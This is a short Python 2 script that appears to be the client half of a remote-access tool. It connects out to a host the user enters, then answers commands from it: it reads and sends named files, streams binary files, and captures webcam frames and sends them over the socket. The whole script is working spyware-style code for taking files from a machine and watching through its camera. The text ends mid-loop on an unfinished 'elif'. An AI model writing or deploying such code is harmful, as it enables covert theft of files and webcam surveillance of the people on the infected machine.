import os
import socket
import subprocess
import cv2



ip = raw_input("enter host: ")
s = socket.socket()
host = ip
port = 9999
s.connect((host,port))

while True:
	data = s.recv(1024)
	# print "-------"+data+"-------"

	if data[:3].decode("utf-8") == 'get':
		file = data[4:].decode("utf-8")
		print file
		f = open(file,'r')
		x = f.read(1024)
		s.send(x)
	elif data[:3].decode("utf-8") == 'img':
		file = data[4:].decode("utf-8")
		print file
		f = open(file,'rb')
		while True:
			l = f.read(1024)
			while (l):
				s.send(l)
				# print('Sent ',repr(l))
				l = f.read(1024)
			if l == '':
				f.close()
				break
	elif data[:3].decode("utf-8") == 'vid':
		cam = cv2.VideoCapture(0)
		while True:
		    ret, frame = cam.read()
		    print type(frame)
		    # print ret
		    s.send(frame)
		    
		    # cv2.imshow("test", frame)
		    # if not ret:
		    #     break
		    k = cv2.waitKey(1)

		    # if k%256 == 27:
		    #     # ESC pressed
		    #     print("Escape hit, closing...")
		    #     break
		    # elif